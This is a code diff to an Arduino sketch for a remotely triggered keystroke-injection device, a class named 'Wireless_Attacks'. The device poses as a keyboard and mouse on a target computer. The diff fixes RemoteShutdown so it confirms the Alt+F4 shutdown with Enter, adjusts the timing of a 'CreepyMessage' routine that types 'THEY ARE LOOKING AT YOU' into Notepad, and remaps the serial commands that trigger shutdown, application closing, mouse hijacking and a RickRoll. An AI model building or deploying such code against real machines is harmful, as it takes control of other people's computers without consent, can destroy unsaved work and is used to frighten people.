@@ -2,7 +2,6 @@
 
 SoftwareSerial WebpageSerial(10, 9);
 
-
 void Wireless_Attacks::PressEnter()
 {
     Keyboard.press(KEY_RETURN);
@@ -12,7 +11,7 @@ void Wireless_Attacks::PressEnter()
 
 void Wireless_Attacks::init()
 {
-    Serial.begin(9600);
+    WebpageSerial.begin(9600);
     Keyboard.begin();
     Mouse.begin();
 }
@@ -52,8 +51,9 @@ void Wireless_Attacks::RemoteShutdown()
     Keyboard.press(KEY_F4);
     delay(3);
     Keyboard.releaseAll();
-    // Keyboard.press(KEY_RETURN);
-    // Keyboard.releaseAll();
+    delay(60);
+    Keyboard.press(KEY_RETURN);
+    Keyboard.releaseAll();
 }
 
 void Wireless_Attacks::CloseApplication()
@@ -89,7 +89,7 @@ void Wireless_Attacks::CreepyMessage()
     delay(700);
     Keyboard.print("start notepad");
     PressEnter();
-    delay(400);
+    delay(1000);
     Keyboard.print("THEY ARE LOOKING AT YOU");
     Keyboard.press(KEY_RETURN);
     Keyboard.release(KEY_RETURN);
@@ -134,11 +134,11 @@ void Wireless_Attacks::Handle()
     if(WebpageSerial.available())
     {
         char command = WebpageSerial.read();
-        if(command == '1'){Serial.println("Starting Test Attack"); TEST_1();}
-        else if(command == '2'){Serial.println("Launching Remote Shutdown"); RemoteShutdown();}
-        else if(command == '3'){Serial.println("Closing Application"); CloseApplication();}
-        else if(command == '4') {Serial.println("Sending Creepy Message Attack"); CreepyMessage();}
-        else if(command == '5'){Serial.println("Opening RickRoll"); RickRoll();}
-        else if(command == '6'){Serial.println("Moving MOuse"); MoveMouseToRandomLocations();}
+        if(command == '1'){TEST_1();}
+        else if(command == '2'){RemoteShutdown();}
+        else if(command == '3'){CloseApplication();}
+        else if(command == '4') {MoveMouseToRandomLocations();}
+        else if(command == '5'){CreepyMessage();}
+        else if(command == '6'){RickRoll();}
     }
 }
